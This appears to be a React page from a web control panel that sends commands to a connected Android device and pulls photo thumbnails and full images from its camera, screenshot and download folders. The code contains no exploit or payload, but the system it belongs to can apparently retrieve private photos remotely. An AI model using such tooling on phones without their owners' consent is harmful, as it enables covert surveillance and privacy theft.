'use client'
import { Suspense, useState, useCallback, useRef, useEffect } from 'react'
import Sidebar from '@/components/Sidebar'
import { useDevice } from '@/contexts/DeviceContext'
import {
  Image, RefreshCw, Circle, ArrowLeft, ChevronRight,
  HardDrive, X, Download, FolderOpen, Folder,
} from 'lucide-react'

interface FileEntry { name: string; type: 'file' | 'dir'; size: string; permissions: string; modified: string }
interface FileListing { path: string; entries: FileEntry[] }

const IMAGE_EXTS = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'bmp']
const isImage = (name: string) => IMAGE_EXTS.includes(name.split('.').pop()?.toLowerCase() ?? '')

const GALLERY_PATHS = [
  { label: 'DCIM/Camera', path: '/storage/emulated/0/DCIM/Camera' },
  { label: 'DCIM',        path: '/storage/emulated/0/DCIM' },
  { label: 'Pictures',    path: '/storage/emulated/0/Pictures' },
  { label: 'Screenshots', path: '/storage/emulated/0/Pictures/Screenshots' },
  { label: 'Download',    path: '/storage/emulated/0/Download' },
]

function sleep(ms: number) { return new Promise(r => setTimeout(r, ms)) }
function getMime(name: string) {
  const ext = name.split('.').pop()?.toLowerCase() ?? 'jpeg'
  return ext === 'png' ? 'image/png' : ext === 'gif' ? 'image/gif' : ext === 'webp' ? 'image/webp' : 'image/jpeg'
}

interface PreviewItem { path: string; name: string; b64: string; mime: string }

/* ── FAST poll: 200ms first check, 350ms interval ── */
async function fastPoll(
  deviceId: string,
  command: string,
  sentAt: number,
  maxAttempts = 30,
): Promise<string> {
  await sleep(200)
  for (let i = 0; i < maxAttempts; i++) {
    if (i > 0) await sleep(350)
    try {
      const r = await fetch(`/api/device/result?deviceId=${deviceId}`)
      const d = await r.json()
      const match = (d.history ?? [])
        .filter((h: { command: string; result: string; timestamp: string }) =>
          h.command === command && new Date(h.timestamp).getTime() > sentAt - 500)
        .sort((a: { timestamp: string }, b: { timestamp: string }) =>
          new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime())[0]
      if (match?.result) return match.result as string
    } catch {}
  }
  return ''
}

async function fastPollListing(
  deviceId: string,
  targetPath: string,
  maxAttempts = 20,
): Promise<FileListing | null> {
  await sleep(200)
  for (let i = 0; i < maxAttempts; i++) {
    if (i > 0) await sleep(350)
    try {
      const res = await fetch(`/api/device/files?deviceId=${deviceId}`)
      const data = await res.json()
      if (data.listing && data.listing.path === targetPath) return data.listing as FileListing
    } catch {}
  }
  return null
}

/* ── Shimmer skeleton tile ── */
function ThumbSkeleton() {
  return (
    <div className="aspect-square rounded-xl overflow-hidden bg-android-surface border border-android-border">
      <div className="w-full h-full animate-pulse bg-gradient-to-br from-white/5 via-white/10 to-white/5" />
    </div>
  )
}

/* ── Single lazy thumbnail — loads only when it enters viewport ── */
interface LazyThumbProps {
  entry: FileEntry
  filePath: string
  cached: string | undefined
  onVisible: (fp: string) => void
  onClick: () => void
}
function LazyThumb({ entry, filePath, cached, onVisible, onClick }: LazyThumbProps) {
  const ref = useRef<HTMLButtonElement>(null)
  const triggered = useRef(false)

  useEffect(() => {
    const el = ref.current
    if (!el) return
    const obs = new IntersectionObserver(
      ([entry]) => {
        if (entry.isIntersecting && !triggered.current) {
          triggered.current = true
          onVisible(filePath)
          obs.disconnect()
        }
      },
      { rootMargin: '200px' } // pre-load 200px before entering viewport
    )
    obs.observe(el)
    return () => obs.disconnect()
  }, [filePath, onVisible])

  return (
    <button
      ref={ref}
      onClick={onClick}
      className="aspect-square bg-android-surface border border-android-border rounded-xl overflow-hidden hover:border-android-blue/50 transition-all duration-150 group relative"
    >
      {cached ? (
        <img
          src={cached}
          alt={entry.name}
          className="w-full h-full object-cover transition-opacity duration-200"
          loading="lazy"
          decoding="async"
        />
      ) : (
        <div className="w-full h-full flex flex-col items-center justify-center gap-1.5 animate-pulse">
          <div className="w-8 h-8 rounded-lg bg-white/5 flex items-center justify-center">
            <Image size={16} className="text-android-border" />
          </div>
          <span className="text-[9px] text-android-muted px-1 text-center leading-tight truncate w-full">{entry.name}</span>
        </div>
      )}
      <div className="absolute inset-0 bg-black/0 group-hover:bg-black/20 transition-colors" />
      {cached && (
        <div className="absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black/60 to-transparent px-1.5 py-1 opacity-0 group-hover:opacity-100 transition-opacity">
          <p className="text-[9px] text-white truncate">{entry.name}</p>
        </div>
      )}
    </button>
  )
}

function GalleryContent() {
  const { devices, selectedId, setSelectedId, connected } = useDevice()
  const [path, setPath]           = useState('/storage/emulated/0/DCIM/Camera')
  const [listing, setListing]     = useState<FileListing | null>(null)
  const [browseLoading, setBrowseLoading] = useState(false)
  const [previews, setPreviews]   = useState<Record<string, string>>({})
  const [loadingSet, setLoadingSet] = useState<Set<string>>(new Set())
  const [fullscreen, setFullscreen] = useState<PreviewItem | null>(null)
  const [fsLoading, setFsLoading] = useState(false)

  const pendingRef  = useRef<Set<string>>(new Set())
  const previewsRef = useRef<Record<string, string>>({})

  useEffect(() => { previewsRef.current = previews }, [previews])

  const sendCmd = useCallback(async (command: string): Promise<string> => {
    if (!selectedId) return ''
    const sentAt = Date.now()
    await fetch('/api/device/command', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ deviceId: selectedId, command }),
    })
    return fastPoll(selectedId, command, sentAt)
  }, [selectedId])

  /* ── Called by IntersectionObserver when thumb enters viewport ──
     Uses thumb_b64: → BitmapFactory.inSampleSize on Android → ~3-8KB JPEG
     vs read_b64: which sends full 3-10MB photo. 100-1000x faster. ── */
  const loadOne = useCallback(async (fp: string) => {
    if (!selectedId) return
    if (previewsRef.current[fp] || pendingRef.current.has(fp)) return
    pendingRef.current.add(fp)
    setLoadingSet(prev => new Set(prev).add(fp))
    try {
      // thumb_b64:path:maxDim:quality — Android generates 200px JPEG q55 thumbnail
      const b64 = await sendCmd(`thumb_b64:${fp}:200:55`)
      if (b64 && !b64.startsWith('ERROR')) {
        const dataUrl = `data:image/jpeg;base64,${b64.trim()}`
        setPreviews(prev => ({ ...prev, [fp]: dataUrl }))
        previewsRef.current = { ...previewsRef.current, [fp]: dataUrl }
      }
    } catch {}
    pendingRef.current.delete(fp)
    setLoadingSet(prev => { const s = new Set(prev); s.delete(fp); return s })
  }, [selectedId, sendCmd])

  const browse = useCallback(async (targetPath: string) => {
    if (!selectedId) return
    setBrowseLoading(true)
    setListing(null)
    setPreviews({})
    previewsRef.current = {}
    pendingRef.current.clear()
    setPath(targetPath)
    try {
      await fetch('/api/device/files', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ deviceId: selectedId, path: targetPath }),
      })
      const result = await fastPollListing(selectedId, targetPath)
      if (result) setListing(result)
    } finally { setBrowseLoading(false) }
  }, [selectedId])

  const openFullscreen = async (entry: FileEntry) => {
    const fp = `${path}/${entry.name}`
    const mime = getMime(entry.name)
    // Show thumbnail immediately while loading full resolution
    const thumbDataUrl = previews[fp] ?? null
    const thumbB64 = thumbDataUrl ? thumbDataUrl.split(',')[1] : ''
    setFsLoading(true)
    setFullscreen({ path: fp, name: entry.name, b64: thumbB64, mime })
    try {
      // Load full quality image for fullscreen viewing
      const b64 = await sendCmd(`read_b64:${fp}`)
      if (b64 && !b64.startsWith('ERROR')) {
        setFullscreen({ path: fp, name: entry.name, b64: b64.trim(), mime })
      }
    } finally { setFsLoading(false) }
  }

  const downloadImage = () => {
    if (!fullscreen?.b64) return
    const bytes = new Uint8Array(atob(fullscreen.b64).split('').map(c => c.charCodeAt(0)))
    const url = URL.createObjectURL(new Blob([bytes], { type: fullscreen.mime }))
    const a = document.createElement('a'); a.href = url; a.download = fullscreen.name; a.click()
    URL.revokeObjectURL(url)
  }

  const imageEntries  = listing?.entries.filter(e => e.type === 'file' && isImage(e.name)) ?? []
  const folderEntries = listing?.entries.filter(e => e.type === 'dir') ?? []
  const breadcrumbs   = path.split('/').filter(Boolean)
  const visibleCrumbs = breadcrumbs.slice(-2)
  const hiddenCount   = breadcrumbs.length - visibleCrumbs.length

  const goUp = () => {
    const parts = path.split('/').filter(Boolean)
    if (parts.length <= 1) return
    browse('/' + parts.slice(0, -1).join('/'))
  }

  const loadingCount = loadingSet.size

  return (
    <div className="flex min-h-screen">
      <Sidebar connected={connected} devices={devices} selectedId={selectedId} onSelect={setSelectedId} />
      <main className="flex-1 page-content overflow-y-auto">
        <div className="max-w-5xl mx-auto px-3 md:px-6 py-3 md:py-6">

          {/* Header */}
          <div className="flex items-center justify-between mb-3">
            <div>
              <h2 className="text-base md:text-xl font-bold text-white flex items-center gap-2">
                <Image size={19} className="text-android-blue" /> Gallery
              </h2>
              <p className="text-android-muted text-xs hidden sm:block">Browse images on device storage</p>
            </div>
            <div className={`flex items-center gap-1.5 text-xs font-medium px-2.5 py-1.5 rounded-full border ${connected ? 'text-android-green border-android-green/30 bg-android-green/10' : 'text-android-red border-android-red/30 bg-android-red/10'}`}>
              <Circle size={7} className={connected ? 'fill-android-green' : 'fill-android-red'} />
              {connected ? 'Online' : 'Offline'}
            </div>
          </div>

          {/* Quick path buttons */}
          <div className="flex gap-1.5 mb-3 overflow-x-auto pb-1">
            {GALLERY_PATHS.map(({ label, path: p }) => (
              <button key={p} onClick={() => browse(p)} disabled={!connected}
                className={`shrink-0 px-2.5 py-1.5 border rounded-lg text-xs transition-colors disabled:opacity-40 whitespace-nowrap font-mono ${p === path ? 'bg-android-blue/10 border-android-blue/40 text-android-blue' : 'bg-android-surface border-android-border text-android-muted hover:text-android-blue hover:border-android-blue/40'}`}>
                {label}
              </button>
            ))}
          </div>

          {/* Breadcrumb bar */}
          <div className="bg-android-surface border border-android-border rounded-xl overflow-hidden mb-3">
            <div className="px-3 py-2 flex items-center gap-2">
              <button onClick={goUp} disabled={!connected} className="p-1.5 rounded-lg hover:bg-android-border/50 disabled:opacity-30 transition-colors">
                <ArrowLeft size={14} className="text-android-muted" />
              </button>
              <div className="flex items-center gap-1 flex-1 overflow-hidden text-xs">
                <HardDrive size={11} className="text-android-muted shrink-0" />
                {hiddenCount > 0 && <span className="text-android-muted">…</span>}
                {visibleCrumbs.map((part, i) => {
                  const idx = hiddenCount + i
                  return (
                    <span key={idx} className="flex items-center gap-1 shrink-0">
                      <ChevronRight size={11} className="text-android-border" />
                      <button onClick={() => browse('/' + breadcrumbs.slice(0, idx + 1).join('/'))}
                        className="text-android-text hover:text-android-blue font-mono truncate max-w-[80px] md:max-w-none">{part}</button>
                    </span>
                  )
                })}
              </div>
              <button onClick={() => browse(path)} disabled={!connected || browseLoading}
                className="p-1.5 rounded-lg hover:bg-android-border/50 disabled:opacity-30">
                <RefreshCw size={12} className={`text-android-muted ${browseLoading ? 'animate-spin' : ''}`} />
              </button>
            </div>
          </div>

          {/* States */}
          {!connected ? (
            <div className="p-12 text-center text-android-muted text-sm bg-android-surface border border-android-border rounded-xl">
              <Image size={40} className="mx-auto mb-3 text-android-border" />
              Connect a device to browse gallery
            </div>
          ) : browseLoading ? (
            <div className="p-12 text-center">
              <RefreshCw size={28} className="text-android-green mx-auto mb-3 animate-spin" />
              <p className="text-android-muted text-sm">Loading folder…</p>
            </div>
          ) : !listing ? (
            <div className="p-12 text-center bg-android-surface border border-android-border rounded-xl">
              <FolderOpen size={40} className="text-android-border mx-auto mb-3" />
              <p className="text-android-muted text-sm">Pilih folder di atas untuk mulai browse</p>
            </div>
          ) : (
            <>
              {/* Folders */}
              {folderEntries.length > 0 && (
                <div className="mb-4">
                  <p className="text-xs text-android-muted mb-2">Folders ({folderEntries.length})</p>
                  <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-2">
                    {folderEntries.map(e => (
                      <button key={e.name} onClick={() => browse(`${path}/${e.name}`)}
                        className="flex items-center gap-2 p-3 bg-android-surface border border-android-border rounded-xl hover:border-android-yellow/40 hover:bg-android-yellow/5 transition-colors text-left">
                        <Folder size={18} className="text-android-yellow shrink-0" />
                        <span className="text-xs text-android-text truncate">{e.name}</span>
                      </button>
                    ))}
                  </div>
                </div>
              )}

              {/* Images */}
              {imageEntries.length === 0 ? (
                <div className="p-8 text-center text-android-muted text-sm bg-android-surface border border-android-border rounded-xl">
                  <Image size={32} className="mx-auto mb-3 text-android-border" />
                  No images in this folder
                </div>
              ) : (
                <>
                  <div className="flex items-center justify-between mb-2">
                    <p className="text-xs text-android-muted">
                      {imageEntries.length} images
                      {loadingCount > 0 && (
                        <span className="ml-1.5 text-android-green animate-pulse">· loading {loadingCount}…</span>
                      )}
                    </p>
                    {loadingCount > 0 && <RefreshCw size={11} className="text-android-green animate-spin" />}
                  </div>

                  <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-2">
                    {imageEntries.map(entry => {
                      const fp = `${path}/${entry.name}`
                      return (
                        <LazyThumb
                          key={entry.name}
                          entry={entry}
                          filePath={fp}
                          cached={previews[fp]}
                          onVisible={loadOne}
                          onClick={() => openFullscreen(entry)}
                        />
                      )
                    })}
                  </div>
                </>
              )}
            </>
          )}
        </div>
      </main>

      {/* Fullscreen viewer */}
      {fullscreen && (
        <div className="fixed inset-0 z-50 bg-black flex flex-col" onClick={e => { if (e.target === e.currentTarget) setFullscreen(null) }}>
          <div className="flex items-center justify-between px-4 py-3 bg-black/60 backdrop-blur shrink-0">
            <span className="text-white text-sm font-medium truncate flex-1 mr-4">{fullscreen.name}</span>
            <div className="flex items-center gap-2">
              {fullscreen.b64 && (
                <button onClick={downloadImage}
                  className="flex items-center gap-1.5 px-3 py-1.5 bg-android-blue/20 border border-android-blue/40 text-android-blue rounded-lg text-xs font-medium">
                  <Download size={13} /> Download
                </button>
              )}
              <button onClick={() => setFullscreen(null)} className="p-1.5 rounded-lg bg-white/10 text-white hover:bg-white/20">
                <X size={18} />
              </button>
            </div>
          </div>
          <div className="flex-1 flex items-center justify-center overflow-hidden p-4 relative">
            {fullscreen.b64 ? (
              <>
                <img
                  src={`data:${fullscreen.mime};base64,${fullscreen.b64}`}
                  alt={fullscreen.name}
                  className={`max-w-full max-h-full object-contain rounded-lg transition-all duration-300 ${fsLoading ? 'blur-sm scale-95' : 'blur-0 scale-100'}`}
                />
                {fsLoading && (
                  <div className="absolute inset-0 flex items-center justify-center">
                    <div className="flex flex-col items-center gap-2 bg-black/50 rounded-xl px-5 py-3">
                      <RefreshCw size={22} className="text-android-green animate-spin" />
                      <p className="text-white/70 text-xs">Loading HD…</p>
                    </div>
                  </div>
                )}
              </>
            ) : (
              <div className="flex flex-col items-center gap-3">
                <RefreshCw size={28} className="text-android-green animate-spin" />
                <p className="text-white/60 text-sm">Loading image…</p>
              </div>
            )}
          </div>
          <div className="px-4 py-2 bg-black/60 shrink-0">
            <p className="text-white/40 text-xs font-mono truncate">{fullscreen.path}</p>
          </div>
        </div>
      )}
    </div>
  )
}

export default function GalleryPage() {
  return (
    <Suspense fallback={<div className="flex min-h-screen items-center justify-center text-android-muted text-sm">Loading…</div>}>
      <GalleryContent />
    </Suspense>
  )
}
